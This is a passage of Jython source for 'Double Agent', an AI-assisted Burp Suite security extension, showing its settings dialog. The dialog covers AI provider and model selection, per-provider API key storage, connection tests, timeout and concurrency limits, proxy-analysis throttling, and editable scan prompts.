                models = self.available_models if self.available_models else [self.MODEL]
                modelLabel.setText("Model:")
                modelLabel.setToolTipText(None)

            for model in models:
                modelCombo.addItem(model)

            if previous_model in models:
                modelCombo.setSelectedItem(previous_model)
            elif len(models) > 0:
                modelCombo.setSelectedIndex(0)
        
        gbc.gridx = 2
        refreshModelsBtn = JButton("Refresh")
        
        def refreshModels(e):
            refreshModelsBtn.setEnabled(False)
            refreshModelsBtn.setText("...")
            self.stdout.println("[SETTINGS] Fetching models...")
            def _do_refresh():
                # Temporarily apply dialog values so test_ai_connection uses them
                old_provider = self.AI_PROVIDER
                old_url = self.API_URL
                old_key = self.API_KEY
                self.AI_PROVIDER = str(providerCombo.getSelectedItem())
                self.API_URL = apiUrlField.getText().strip()
                self.API_KEY = "".join(apiKeyField.getPassword())
                try:
                    if self.test_ai_connection():
                        def _update_ui():
                            modelCombo.removeAllItems()
                            models = self._bedrock_serverless_models() if self.AI_PROVIDER == "Bedrock" else self.available_models
                            for model in models:
                                modelCombo.addItem(model)
                            if self.MODEL in models:
                                modelCombo.setSelectedItem(self.MODEL)
                            elif len(models) > 0:
                                modelCombo.setSelectedIndex(0)
                            self.stdout.println("[SETTINGS] Models refreshed")
                            refreshModelsBtn.setEnabled(True)
                            refreshModelsBtn.setText("Refresh")
                        SwingUtilities.invokeLater(lambda: _update_ui())
                    else:
                        # Restore previous values on failure
                        self.AI_PROVIDER = old_provider
                        self.API_URL = old_url
                        self.API_KEY = old_key
                        def _restore():
                            refreshModelsBtn.setEnabled(True)
                            refreshModelsBtn.setText("Refresh")
                        SwingUtilities.invokeLater(lambda: _restore())
                except:
                    self.AI_PROVIDER = old_provider
                    self.API_URL = old_url
                    self.API_KEY = old_key
                    def _restore():
                        refreshModelsBtn.setEnabled(True)
                        refreshModelsBtn.setText("Refresh")
                    SwingUtilities.invokeLater(lambda: _restore())
            t = threading.Thread(target=_do_refresh)
            t.setDaemon(True)
            t.start()

        refreshModelsBtn.addActionListener(refreshModels)
        aiPanel.add(refreshModelsBtn, gbc)

        def updateRefreshButtonState():
            is_bedrock = str(providerCombo.getSelectedItem()) == "Bedrock"
            refreshModelsBtn.setEnabled(True)
            if is_bedrock:
                refreshModelsBtn.setToolTipText("Refresh serverless Bedrock models only: ON_DEMAND foundation models and SYSTEM_DEFINED inference profiles")
            else:
                refreshModelsBtn.setToolTipText("Refresh available models")

        _prev_provider = [self.AI_PROVIDER]  # mutable container to track previous selection

        def updateProviderFieldState():
            provider = str(providerCombo.getSelectedItem())

            # Save the key currently in the field for the PREVIOUS provider before swapping
            current_key = "".join(apiKeyField.getPassword())
            if current_key and _prev_provider[0]:
                self.API_KEYS_PER_PROVIDER[_prev_provider[0]] = current_key
            _prev_provider[0] = provider

            is_bedrock = provider == "Bedrock"
            uses_api_key = provider in ("OpenAI", "Claude", "Gemini", "Bedrock", "DeepSeek")

            apiKeyLabel.setVisible(uses_api_key)

            if is_bedrock:
                apiUrlLabel.setVisible(False)
                apiUrlField.setVisible(False)
                apiKeyLabel.setText("Bedrock API Key:")
                apiUrlField.setText("https://bedrock-runtime.us-east-1.amazonaws.com")
            else:
                apiUrlLabel.setVisible(True)
                apiUrlField.setVisible(True)
                if provider == "OpenAI":
                    apiKeyLabel.setText("OpenAI API Key:")
                elif provider == "Claude":
                    apiKeyLabel.setText("Claude API Key:")
                elif provider == "Gemini":
                    apiKeyLabel.setText("Gemini API Key:")
                elif provider == "DeepSeek":
                    apiKeyLabel.setText("DeepSeek API Key:")
                else:
                    apiKeyLabel.setText("API Key:")

            # Swap API key field to show the stored key for this provider
            stored_key = self.API_KEYS_PER_PROVIDER.get(provider, "")
            apiKeyField.setText(stored_key)

            aiPanel.revalidate()
            aiPanel.repaint()

        providerCombo.addActionListener(lambda e: updateModelComboForProvider())
        providerCombo.addActionListener(lambda e: updateRefreshButtonState())
        providerCombo.addActionListener(lambda e: updateProviderFieldState())
        updateModelComboForProvider()
        updateRefreshButtonState()
        updateProviderFieldState()
        row += 1
        
        gbc.gridx = 0
        gbc.gridy = row
        aiPanel.add(JLabel("Max Tokens:"), gbc)
        gbc.gridx = 1
        gbc.gridwidth = 2
        maxTokensField = JTextField(str(self.MAX_TOKENS), 10)
        aiPanel.add(maxTokensField, gbc)
        gbc.gridwidth = 1
        row += 1
        
        gbc.gridx = 0
        gbc.gridy = row
        gbc.gridwidth = 3
        testBtn = JButton("Test Connection")
        
        def testConnection(e):
            testBtn.setEnabled(False)
            testBtn.setText("Testing...")
            old_provider = self.AI_PROVIDER
            old_url = self.API_URL
            old_key = self.API_KEY
            old_model = self.MODEL
            old_bedrock_region = self.BEDROCK_REGION

            selected_provider = str(providerCombo.getSelectedItem())
            self.AI_PROVIDER = selected_provider
            self.API_KEY = "".join(apiKeyField.getPassword())
            self.MODEL = str(modelCombo.getSelectedItem())
            self.BEDROCK_REGION = "us-east-1"  # Hardcoded
            self.API_URL = apiUrlField.getText().strip()
            if selected_provider == "Bedrock":
                self.API_URL = "https://bedrock-runtime.%s.amazonaws.com" % self.BEDROCK_REGION
            else:
                self.API_URL = apiUrlField.getText()

            def _do_test():
                error_msg = None
                success_msg = None
                try:
                    success = self.test_ai_connection()
                    if not success:
                        self.AI_PROVIDER = old_provider
                        self.API_URL = old_url
                        self.API_KEY = old_key
                        self.MODEL = old_model
                        self.BEDROCK_REGION = old_bedrock_region
                        error_msg = "Connection failed. Check the console for detailed error messages.\n\nCommon causes:\n- Wrong API URL or port\n- Missing or invalid API key\n- Network connectivity issues\n- AI service not running or blocked"
                    else:
                        if self.save_config():
                            self.stdout.println("[SETTINGS] Test connection succeeded; credentials saved locally")
                        success_msg = "Successfully connected to %s!\n\nModel: %s\nCredentials saved to local config." % (self.AI_PROVIDER, self.MODEL)
                except Exception as e:
                    error_msg = "Test connection error: %s" % str(e)
                    self.stderr.println("[SETTINGS ERROR] %s" % error_msg)
                finally:
                    def _restore():
                        testBtn.setEnabled(True)
                        testBtn.setText("Test Connection")
                        from javax.swing import JOptionPane
                        if error_msg:
                            JOptionPane.showMessageDialog(
                                dialog,
                                error_msg,
                                "Connection Failed",
                                JOptionPane.ERROR_MESSAGE
                            )
                        elif success_msg:
                            JOptionPane.showMessageDialog(
                                dialog,
                                success_msg,
                                "Connection Successful",
                                JOptionPane.INFORMATION_MESSAGE
                            )
                    SwingUtilities.invokeLater(lambda: _restore())
            t = threading.Thread(target=_do_test)
            t.setDaemon(True)
            t.start()

        testBtn.addActionListener(testConnection)
        aiPanel.add(testBtn, gbc)
        row += 1
        
        gbc.gridy = row
        helpText = JTextArea("")
        helpText.setEditable(False)
        helpText.setBackground(aiPanel.getBackground())
        aiPanel.add(helpText, gbc)

        def updateProviderHelpText():
            provider = str(providerCombo.getSelectedItem())
            if provider == "Ollama":
                text = (
                    "Provider: Ollama\n\n"
                    "URL: http://localhost:11434\n"
                    "Auth: No API key required."
                )
            elif provider == "OpenAI":
                text = (
                    "Provider: OpenAI\n\n"
                    "URL: https://api.openai.com/v1\n"
                    "Auth: API key required."
                )
            elif provider == "Claude":
                text = (
                    "Provider: Claude\n\n"
                    "URL: https://api.anthropic.com/v1\n"
                    "Auth: API key required."
                )
            elif provider == "Gemini":
                text = (
                    "Provider: Gemini\n\n"
                    "URL: https://generativelanguage.googleapis.com/v1\n"
                    "Auth: API key required."
                )
            elif provider == "Bedrock":
                text = (
                    "Provider: Bedrock\n\n"
                    "Runtime URL is auto-configured from Region.\n"
                    "Auth: Bedrock API key (Bearer token) required.\n"
                    "Models: serverless only. Lists ON_DEMAND foundation models and SYSTEM_DEFINED inference profiles.\n"
                    "Blocked: provisioned, custom, imported, marketplace, endpoint and application inference profile IDs."
                )
            elif provider == "DeepSeek":
                text = (
                    "Provider: DeepSeek\n\n"
                    "URL: https://api.deepseek.com/v1\n"
                    "Auth: API key required.\n"
                    "Models: deepseek-chat, deepseek-reasoner"
                )
            else:
                text = "Select a provider to see setup guidance."
            helpText.setText(text)

        providerCombo.addActionListener(lambda e: updateProviderHelpText())
        updateProviderHelpText()
        
        aiScroll = JScrollPane(aiPanel)
        aiScroll.setVerticalScrollBarPolicy(JScrollPane.VERTICAL_SCROLLBAR_AS_NEEDED)
        aiScroll.setHorizontalScrollBarPolicy(JScrollPane.HORIZONTAL_SCROLLBAR_NEVER)
        tabbedPane.addTab("AI Provider", aiScroll)
        
        # ADVANCED TAB
        advancedPanel = JPanel(GridBagLayout())
        gbc = GridBagConstraints()
        gbc.insets = Insets(5, 5, 5, 5)
        gbc.anchor = GridBagConstraints.WEST
        gbc.fill = GridBagConstraints.HORIZONTAL
        
        row = 0

        # Help text for proxy traffic analysis
        gbc.gridx = 0
        gbc.gridy = row
        gbc.gridwidth = 2
        passiveScanHelp = JTextArea(
            "Proxy traffic analysis toggle has been moved to the main panel for easier access.\n"
            "WARNING ($$): analyzing proxied traffic can significantly increase token/API costs.\n"
            "When disabled, you can still manually analyze requests via right-click context menu.\n"
            "Disabling proxy traffic analysis helps save API tokens by only\n"
            "analyzing requests you explicitly select."
        )
        passiveScanHelp.setEditable(False)
        passiveScanHelp.setBackground(advancedPanel.getBackground())
        passiveScanHelp.setFont(Font("Dialog", Font.ITALIC, 10))
        advancedPanel.add(passiveScanHelp, gbc)
        row += 1
        gbc.gridwidth = 1

        # Theme dropdown
        gbc.gridx = 0
        gbc.gridy = row
        advancedPanel.add(JLabel("Console Theme:"), gbc)
        gbc.gridx = 1
        themeCombo = JComboBox(["Auto", "Light", "Dark"])
        themeCombo.setSelectedItem(self.THEME)
        advancedPanel.add(themeCombo, gbc)
        row += 1

        gbc.gridx = 0
        gbc.gridy = row
        advancedPanel.add(JLabel("Verbose Logging:"), gbc)
        gbc.gridx = 1
        verboseCheck = JCheckBox("", self.VERBOSE)
        advancedPanel.add(verboseCheck, gbc)
        row += 1

        gbc.gridx = 0
        gbc.gridy = row
        gbc.gridwidth = 1
        advancedPanel.add(JLabel("Project Folder:"), gbc)
        gbc.gridx = 1
        workspaceDirField = JTextField(str(self.PROJECT_WORKSPACE_DIR or ""), 34)
        advancedPanel.add(workspaceDirField, gbc)
        gbc.gridx = 2
        browseWorkspaceBtn = JButton("Browse...")
        def browseWorkspaceDir(e):
            chooser = JFileChooser(workspaceDirField.getText().strip() or str(self.PROJECT_WORKSPACE_DIR or ""))
            chooser.setFileSelectionMode(JFileChooser.DIRECTORIES_ONLY)
            chooser.setAcceptAllFileFilterUsed(False)
            result = chooser.showOpenDialog(dialog)
            if result == JFileChooser.APPROVE_OPTION:
                selected = chooser.getSelectedFile()
                if selected is not None:
                    workspaceDirField.setText(selected.getAbsolutePath())
        browseWorkspaceBtn.addActionListener(browseWorkspaceDir)
        advancedPanel.add(browseWorkspaceBtn, gbc)
        row += 1

        gbc.gridx = 0
        gbc.gridy = row
        gbc.gridwidth = 3
        workspaceHelp = JTextArea(
            "Double Agent asks for this folder when the extension loads. It saves double-agent.json and reads scope.md, target.md, and findings.md from this project folder."
        )
        workspaceHelp.setEditable(False)
        workspaceHelp.setBackground(advancedPanel.getBackground())
        workspaceHelp.setFont(Font("Dialog", Font.ITALIC, 10))
        advancedPanel.add(workspaceHelp, gbc)
        row += 1
        gbc.gridwidth = 1

        # AI Request Timeout setting
        gbc.gridx = 0
        gbc.gridy = row
        advancedPanel.add(JLabel("AI Request Timeout (seconds):"), gbc)
        gbc.gridx = 1
        timeoutField = JTextField(str(self.AI_REQUEST_TIMEOUT), 10)
        advancedPanel.add(timeoutField, gbc)
        row += 1
        
        # Help text for timeout
        gbc.gridx = 0
        gbc.gridy = row
        gbc.gridwidth = 2
        timeoutHelp = JTextArea(
            "Timeout for AI API requests (default: 60 seconds).\n"
            "Range: 10 to 99999 seconds (27.7 hours max).\n"
            "Increase if you get timeout errors.\n"
            "Recommended: 30-120s (fast models), 180-600s (large models)."
        )
        timeoutHelp.setEditable(False)
        timeoutHelp.setBackground(advancedPanel.getBackground())
        timeoutHelp.setFont(Font("Dialog", Font.ITALIC, 10))
        advancedPanel.add(timeoutHelp, gbc)
        row += 1
        gbc.gridwidth = 1

        # Analysis worker concurrency
        gbc.gridx = 0
        gbc.gridy = row
        advancedPanel.add(JLabel("Analysis Worker Threads:"), gbc)
        gbc.gridx = 1
        workerField = JTextField(str(self.ANALYSIS_WORKERS), 10)
        advancedPanel.add(workerField, gbc)
        row += 1

        gbc.gridx = 0
        gbc.gridy = row
        gbc.gridwidth = 2
        workerHelp = JTextArea(
            "Concurrent analysis workers (default: 1).\n"
            "Range: 1 to 10. Higher = more parallel scans, but more API/network load."
        )
        workerHelp.setEditable(False)
        workerHelp.setBackground(advancedPanel.getBackground())
        workerHelp.setFont(Font("Dialog", Font.ITALIC, 10))
        advancedPanel.add(workerHelp, gbc)
        row += 1
        gbc.gridwidth = 1

        gbc.gridx = 0
        gbc.gridy = row
        advancedPanel.add(JLabel("AI Request Concurrency:"), gbc)
        gbc.gridx = 1
        aiConcurrencyField = JTextField(str(self.AI_REQUEST_CONCURRENCY), 10)
        advancedPanel.add(aiConcurrencyField, gbc)
        row += 1

        gbc.gridx = 0
        gbc.gridy = row
        gbc.gridwidth = 2
        aiConcurrencyHelp = JTextArea(
            "Maximum simultaneous AI provider calls (default: 2).\n"
            "Keep this low for Bedrock to avoid timeout/no-response bursts."
        )
        aiConcurrencyHelp.setEditable(False)
        aiConcurrencyHelp.setBackground(advancedPanel.getBackground())
        aiConcurrencyHelp.setFont(Font("Dialog", Font.ITALIC, 10))
        advancedPanel.add(aiConcurrencyHelp, gbc)
        row += 1
        gbc.gridwidth = 1

        # Proxy auto-analysis backpressure settings
        gbc.gridx = 0
        gbc.gridy = row
        advancedPanel.add(JLabel("Proxy Auto-Analysis Backlog:"), gbc)
        gbc.gridx = 1
        proxyBacklogField = JTextField(str(self.MAX_PROXY_QUEUED_ANALYSES), 10)
        advancedPanel.add(proxyBacklogField, gbc)
        row += 1

        gbc.gridx = 0
        gbc.gridy = row
        advancedPanel.add(JLabel("Proxy Intake Interval (seconds):"), gbc)
        gbc.gridx = 1
        proxyIntervalField = JTextField(str(self.PROXY_ANALYSIS_MIN_INTERVAL_SECONDS), 10)
        advancedPanel.add(proxyIntervalField, gbc)
        row += 1

        gbc.gridx = 0
        gbc.gridy = row
        gbc.gridwidth = 2
        proxyPerfHelp = JTextArea(
            "Limits automatic Proxy traffic analysis so Burp stays responsive.\n"
            "Manual right-click analysis still uses the normal worker setting.\n"
            "Recommended: backlog 2-4, interval 0.5-2.0s."
        )
        proxyPerfHelp.setEditable(False)
        proxyPerfHelp.setBackground(advancedPanel.getBackground())
        proxyPerfHelp.setFont(Font("Dialog", Font.ITALIC, 10))
        advancedPanel.add(proxyPerfHelp, gbc)
        row += 1
        gbc.gridwidth = 1
        
        # Debug Tasks button
        gbc.gridx = 0
        gbc.gridy = row
        gbc.gridwidth = 2
        debugTasksBtn = JButton("Run Task Diagnostics", actionPerformed=self.debugTasks)
        advancedPanel.add(debugTasksBtn, gbc)
        row += 1
        
        # Help text for debug
        gbc.gridy = row
        debugHelp = JTextArea(
            "Click to generate detailed diagnostic report for stuck/queued tasks.\n"
            "Shows task counts, durations, threading status, and recommendations."
        )
        debugHelp.setEditable(False)
        debugHelp.setBackground(advancedPanel.getBackground())
        debugHelp.setFont(Font("Dialog", Font.ITALIC, 10))
        advancedPanel.add(debugHelp, gbc)
        row += 1

        gbc.gridwidth = 1
        
        gbc.gridx = 0
        gbc.gridy = row
        gbc.gridwidth = 2
        infoNotice = JTextArea(
            "Double Agent\n\n"
            "AI-powered passive security analysis + Agent agentic pair-testing for Burp Suite.\n\n"
            "Use the API docs endpoint for current agent workflow details."
        )
        infoNotice.setEditable(False)
        infoNotice.setBackground(advancedPanel.getBackground())
        infoNotice.setFont(Font("Dialog", Font.PLAIN, 11))
        advancedPanel.add(infoNotice, gbc)
        
        advancedScroll = JScrollPane(advancedPanel)
        advancedScroll.setVerticalScrollBarPolicy(JScrollPane.VERTICAL_SCROLLBAR_AS_NEEDED)
        advancedScroll.setHorizontalScrollBarPolicy(JScrollPane.HORIZONTAL_SCROLLBAR_NEVER)
        tabbedPane.addTab("Advanced", advancedScroll)

        # === SYSTEM PROMPT TAB ===
        promptPanel = JPanel(GridBagLayout())
        promptPanel.setBorder(BorderFactory.createEmptyBorder(10, 10, 10, 10))
        pgbc = GridBagConstraints()
        pgbc.insets = Insets(5, 5, 5, 5)
        pgbc.fill = GridBagConstraints.HORIZONTAL
        pgbc.anchor = GridBagConstraints.NORTHWEST

        # Scan prompt label
        pgbc.gridx = 0
        pgbc.gridy = 0
        pgbc.weightx = 1.0
        pgbc.weighty = 0.0
        scanPromptLabel = JLabel("Per-Request Scan Prompt:")
        scanPromptLabel.setFont(Font("Dialog", Font.BOLD, 12))
        promptPanel.add(scanPromptLabel, pgbc)

        # Scan prompt help
        pgbc.gridy = 1
        scanPromptHelp = JTextArea(
            "This prompt is sent to the AI for every request analysis. "
            "Edit to tune finding quality, suppress false positives, or change focus areas. "
            "The request data is appended automatically after this prompt."
        )
        scanPromptHelp.setLineWrap(True)
        scanPromptHelp.setWrapStyleWord(True)
        scanPromptHelp.setEditable(False)
        scanPromptHelp.setBackground(promptPanel.getBackground())
        scanPromptHelp.setFont(Font("Dialog", Font.PLAIN, 11))
        promptPanel.add(scanPromptHelp, pgbc)

        # Scan prompt text area - show current prompt (custom or default)
        pgbc.gridy = 2
        pgbc.fill = GridBagConstraints.BOTH
        pgbc.weighty = 0.45
        currentScanPrompt = self.CUSTOM_SCAN_PROMPT if self.CUSTOM_SCAN_PROMPT else self._default_scan_prompt()
        scanPromptArea = JTextArea(currentScanPrompt, 12, 60)
        scanPromptArea.setLineWrap(True)
        scanPromptArea.setWrapStyleWord(True)
        scanPromptArea.setFont(Font("Monospaced", Font.PLAIN, 12))
        scanPromptScroll = JScrollPane(scanPromptArea)
        promptPanel.add(scanPromptScroll, pgbc)

        # Reset scan prompt button
        pgbc.gridy = 3
        pgbc.fill = GridBagConstraints.NONE
        pgbc.weighty = 0.0
        pgbc.anchor = GridBagConstraints.WEST
        resetScanBtn = JButton("Reset to Default")
        resetScanBtn.addActionListener(lambda e: scanPromptArea.setText(self._default_scan_prompt()))
        promptPanel.add(resetScanBtn, pgbc)

        # Flow prompt label
        pgbc.gridy = 4
        pgbc.fill = GridBagConstraints.HORIZONTAL
        pgbc.anchor = GridBagConstraints.NORTHWEST
        flowPromptLabel = JLabel("Flow Analysis Prompt:")
        flowPromptLabel.setFont(Font("Dialog", Font.BOLD, 12))
        promptPanel.add(flowPromptLabel, pgbc)

        # Flow prompt help
        pgbc.gridy = 5
        flowPromptHelp = JTextArea(
            "This prompt is sent to the AI when analyzing multi-request flows. "
            "The flow step data is appended automatically after this prompt."
        )
        flowPromptHelp.setLineWrap(True)
        flowPromptHelp.setWrapStyleWord(True)
        flowPromptHelp.setEditable(False)
        flowPromptHelp.setBackground(promptPanel.getBackground())
        flowPromptHelp.setFont(Font("Dialog", Font.PLAIN, 11))
        promptPanel.add(flowPromptHelp, pgbc)

        # Flow prompt text area - show current prompt (custom or default)
        pgbc.gridy = 6
        pgbc.fill = GridBagConstraints.BOTH
        pgbc.weighty = 0.45
        currentFlowPrompt = self.CUSTOM_FLOW_PROMPT if self.CUSTOM_FLOW_PROMPT else self._default_flow_prompt()
        flowPromptArea = JTextArea(currentFlowPrompt, 12, 60)
        flowPromptArea.setLineWrap(True)
        flowPromptArea.setWrapStyleWord(True)
        flowPromptArea.setFont(Font("Monospaced", Font.PLAIN, 12))
        flowPromptScroll = JScrollPane(flowPromptArea)
        promptPanel.add(flowPromptScroll, pgbc)

        # Reset flow prompt button
        pgbc.gridy = 7
        pgbc.fill = GridBagConstraints.NONE
        pgbc.weighty = 0.0
        pgbc.anchor = GridBagConstraints.WEST
        resetFlowBtn = JButton("Reset to Default")
        resetFlowBtn.addActionListener(lambda e: flowPromptArea.setText(self._default_flow_prompt()))
        promptPanel.add(resetFlowBtn, pgbc)

        promptScroll = JScrollPane(promptPanel)
        promptScroll.setVerticalScrollBarPolicy(JScrollPane.VERTICAL_SCROLLBAR_AS_NEEDED)
        promptScroll.setHorizontalScrollBarPolicy(JScrollPane.HORIZONTAL_SCROLLBAR_NEVER)
        tabbedPane.addTab("System Prompt", promptScroll)

        # BUTTONS
        buttonPanel = JPanel()
        
        def saveSettings(e):
            def _estimate_openai_context_window(model_name):
                model_l = str(model_name or "").lower()
                if "gpt-4o" in model_l or "gpt-4.1" in model_l or "gpt-5" in model_l:
                    return 128000
                if model_l.startswith("gpt-4"):
                    return 8192
                if "gpt-3.5" in model_l:
                    return 16385
                return 0

            # Save AI Provider settings
            self.AI_PROVIDER = str(providerCombo.getSelectedItem())
            self.API_URL = apiUrlField.getText()
            self.API_KEY = "".join(apiKeyField.getPassword())
            self.MODEL = str(modelCombo.getSelectedItem())
            self.BEDROCK_REGION = "us-east-1"  # Hardcoded

            # Store API key per-provider so switching doesn't lose keys
            self.API_KEYS_PER_PROVIDER[self.AI_PROVIDER] = self.API_KEY

            if self.AI_PROVIDER == "Bedrock":
                self.API_URL = "https://bedrock-runtime.%s.amazonaws.com" % self.BEDROCK_REGION

            if self.AI_PROVIDER == "OpenAI":
                model_ctx = _estimate_openai_context_window(self.MODEL)
                if model_ctx < 120000:
                    self.stderr.println("[!] Selected OpenAI model '%s' is blocked (context window < 120k)." % self.MODEL)
                    self.stderr.println("[!] Please choose an eligible model with >=120k context window.")
                    return
            elif self.AI_PROVIDER == "Bedrock":
                has_bearer_token = bool(str(self.API_KEY or "").strip())
                if not has_bearer_token:
                    self.stderr.println("[!] Bedrock requires API Key (Bearer token)")
                    return
                serverless_models = self._bedrock_serverless_models()
                if self.MODEL not in serverless_models:
                    self.stderr.println("[!] Bedrock model '%s' is blocked because it is not in the serverless allow-list." % self.MODEL)
                    self.stderr.println("[!] Click Refresh and choose an ON_DEMAND foundation model or SYSTEM_DEFINED inference profile.")
                    return

            try:
                self.MAX_TOKENS = int(maxTokensField.getText())
            except ValueError:
                self.MAX_TOKENS = 2048
                self.stderr.println("[!] Invalid Max Tokens value, using default: 2048")
            
            # Save Advanced settings
            self.PASSIVE_SCANNING_ENABLED = self.passiveScanCheck.isSelected()
            self.THEME = str(themeCombo.getSelectedItem())
            self.VERBOSE = verboseCheck.isSelected()

            # Save custom system prompts (empty = use default)
            scan_text = scanPromptArea.getText().strip()
            self.CUSTOM_SCAN_PROMPT = "" if scan_text == self._default_scan_prompt().strip() else scan_text
            flow_text = flowPromptArea.getText().strip()
            self.CUSTOM_FLOW_PROMPT = "" if flow_text == self._default_flow_prompt().strip() else flow_text

            # Apply theme immediately
            self.applyConsoleTheme()

            # Save timeout setting
            try:
                timeout = int(timeoutField.getText())
                if timeout < 10:
                    self.AI_REQUEST_TIMEOUT = 10
                    self.stderr.println("[!] Timeout too low, using minimum: 10 seconds")
                elif timeout > 99999:
                    self.AI_REQUEST_TIMEOUT = 99999
                    self.stderr.println("[!] Timeout too high, using maximum: 99999 seconds")
                else:
                    self.AI_REQUEST_TIMEOUT = timeout
            except ValueError:
                self.AI_REQUEST_TIMEOUT = 60
                self.stderr.println("[!] Invalid timeout value, using default: 60 seconds")

            # Save analysis worker setting
            try:
                worker_count = int(workerField.getText())
                if worker_count < 1:
                    self.ANALYSIS_WORKERS = 1
                    self.stderr.println("[!] Worker count too low, using minimum: 1")
                elif worker_count > 10:
                    self.ANALYSIS_WORKERS = 10
                    self.stderr.println("[!] Worker count too high, using maximum: 10")
                else:
                    self.ANALYSIS_WORKERS = worker_count
            except ValueError:
                self.ANALYSIS_WORKERS = 1
                self.stderr.println("[!] Invalid worker count, using default: 1")

            try:
                ai_concurrency = int(aiConcurrencyField.getText())
                if ai_concurrency < 1:
                    self.AI_REQUEST_CONCURRENCY = 1
                    self.stderr.println("[!] AI request concurrency too low, using minimum: 1")
                elif ai_concurrency > 5:
                    self.AI_REQUEST_CONCURRENCY = 5
                    self.stderr.println("[!] AI request concurrency too high, using maximum: 5")
                else:
                    self.AI_REQUEST_CONCURRENCY = ai_concurrency
            except ValueError:
                self.AI_REQUEST_CONCURRENCY = 2
                self.stderr.println("[!] Invalid AI request concurrency, using default: 2")

            if self.AI_PROVIDER == "Bedrock" and int(self.AI_REQUEST_TIMEOUT) < int(getattr(self, "MIN_BEDROCK_REQUEST_TIMEOUT", 120)):
                self.AI_REQUEST_TIMEOUT = int(getattr(self, "MIN_BEDROCK_REQUEST_TIMEOUT", 120))
                self.stderr.println("[!] Bedrock timeout too low, using minimum: %d seconds" % int(self.AI_REQUEST_TIMEOUT))

            # Rebuild semaphores with new concurrency
            self.semaphore = threading.Semaphore(max(1, int(self.ANALYSIS_WORKERS)))
            self._ai_request_semaphore = threading.Semaphore(max(1, int(self.AI_REQUEST_CONCURRENCY)))

            try:
                proxy_backlog = int(proxyBacklogField.getText())
                if proxy_backlog < 1:
                    self.MAX_PROXY_QUEUED_ANALYSES = 1
                    self.stderr.println("[!] Proxy backlog too low, using minimum: 1")
                elif proxy_backlog > 20:
                    self.MAX_PROXY_QUEUED_ANALYSES = 20
                    self.stderr.println("[!] Proxy backlog too high, using maximum: 20")
                else:
                    self.MAX_PROXY_QUEUED_ANALYSES = proxy_backlog
            except ValueError:
                self.MAX_PROXY_QUEUED_ANALYSES = 3
                self.stderr.println("[!] Invalid proxy backlog, using default: 3")

            try:
                proxy_interval = float(proxyIntervalField.getText())
                if proxy_interval < 0:
                    self.PROXY_ANALYSIS_MIN_INTERVAL_SECONDS = 0.0
                    self.stderr.println("[!] Proxy interval too low, using minimum: 0")
                elif proxy_interval > 10:
                    self.PROXY_ANALYSIS_MIN_INTERVAL_SECONDS = 10.0
                    self.stderr.println("[!] Proxy interval too high, using maximum: 10")
                else:
                    self.PROXY_ANALYSIS_MIN_INTERVAL_SECONDS = proxy_interval
            except ValueError:
                self.PROXY_ANALYSIS_MIN_INTERVAL_SECONDS = 1.0
                self.stderr.println("[!] Invalid proxy interval, using default: 1.0")

            try:
                workspace_dir = str(workspaceDirField.getText() or "").strip()
                if not workspace_dir:
                    self.stderr.println("[!] Project Folder is required")
                    return
                resolved_workspace_dir = self._normalize_project_workspace_dir(workspace_dir)
                if not resolved_workspace_dir:
                    self.stderr.println("[!] Could not resolve Project Folder")
                    return
                self.PROJECT_WORKSPACE_DIR = resolved_workspace_dir
            except Exception as e:
                self.stderr.println("[!] Invalid Project Folder: %s" % self._safe_ascii_text(e))
                return
            
            # Log confirmation
            self.stdout.println("\n[SETTINGS] OK Configuration saved successfully")
            self.stdout.println("[SETTINGS] AI Provider: %s" % self.AI_PROVIDER)
            self.stdout.println("[SETTINGS] API URL: %s" % self.API_URL)
            self.stdout.println("[SETTINGS] Model: %s" % self.MODEL)
            self.stdout.println("[SETTINGS] Max Tokens: %d" % int(self.MAX_TOKENS))
            self.stdout.println("[SETTINGS] Request Timeout: %d seconds" % int(self.AI_REQUEST_TIMEOUT))
            self.stdout.println("[SETTINGS] Analysis Workers: %d" % int(self.ANALYSIS_WORKERS))
            self.stdout.println("[SETTINGS] AI Request Concurrency: %d" % int(self.AI_REQUEST_CONCURRENCY))
            self.stdout.println("[SETTINGS] Proxy Auto-Analysis Backlog: %d" % int(self.MAX_PROXY_QUEUED_ANALYSES))
            self.stdout.println("[SETTINGS] Proxy Intake Interval: %.1fs" % float(self.PROXY_ANALYSIS_MIN_INTERVAL_SECONDS))
            self.stdout.println("[SETTINGS] Console Theme: %s" % self.THEME)
            self.stdout.println("[SETTINGS] Verbose Logging: %s" % ("Enabled" if self.VERBOSE else "Disabled"))
            self.stdout.println("[SETTINGS] Proxy traffic analysis: %s" % ("Enabled" if self.PASSIVE_SCANNING_ENABLED else "Disabled"))
            self.stdout.println("[SETTINGS] Project Folder: %s" % self._workspace_directory())

            # Save configuration to disk
            if self.save_config():
                self.stdout.println("[SETTINGS] OK Configuration persisted to disk")
            self.save_findings()
            self.stdout.println("[SETTINGS] Findings sidecar: %s" % self._safe_ascii_text(self._double_agent_file_path(), 2000))

            # Refresh stats immediately so model and pricing fields reflect new settings
            self._ui_dirty = True
            self.refreshUI()
            
            dialog.dispose()
        
        saveBtn = JButton("Save")
        saveBtn.addActionListener(saveSettings)
        buttonPanel.add(saveBtn)
        
        cancelBtn = JButton("Cancel")
        cancelBtn.addActionListener(lambda e: dialog.dispose())
        buttonPanel.add(cancelBtn)
        
        # Assemble dialog
        dialog.add(tabbedPane, BorderLayout.CENTER)
        dialog.add(buttonPanel, BorderLayout.SOUTH)
        
        # Apply theme to dialog
        self._apply_dark_theme_to_container(dialog)

        # Show dialog
        dialog.setVisible(True)

    def log_to_console(self, message):
        with self.console_lock:
            timestamp = datetime.now().strftime("%H:%M:%S")
            message_str = str(message)
            
            if "http://" in message_str or "https://" in message_str:
                import re
                def truncate_url(match):
                    url = match.group(0)
                    if len(url) > 100:
                        return url[:97] + "..."
                    return url
                
                message_str = re.sub(r'https?://[^\s]+', truncate_url, message_str)
            
            if len(message_str) > 150:
                message_str = message_str[:147] + "..."
            
            formatted_msg = "[%s] %s" % (timestamp, message_str)
            self.console_messages.append(formatted_msg)
            
            if len(self.console_messages) > self.max_console_messages:
                self.console_messages = self.console_messages[-self.max_console_messages:]
        self._ui_dirty = True

    def _perf_ms_since(self, start):
        try:
            return int((time.time() - start) * 1000)
        except:
            return 0

    def _perf_debug(self, message, key="", min_interval=0.0, force=False):
        return

    def _perf_counts_snapshot(self):
        try:
            with self.tasks_lock:
                total_tasks = len(self.tasks)
                active_tasks = 0
                queued_tasks = 0
                proxy_tasks = 0
                for task in self.tasks[-1000:]:
                    status = str(task.get("status", ""))
                    if "Analyzing" in status or "Waiting" in status:
                        active_tasks += 1
                    elif "Queued" in status:
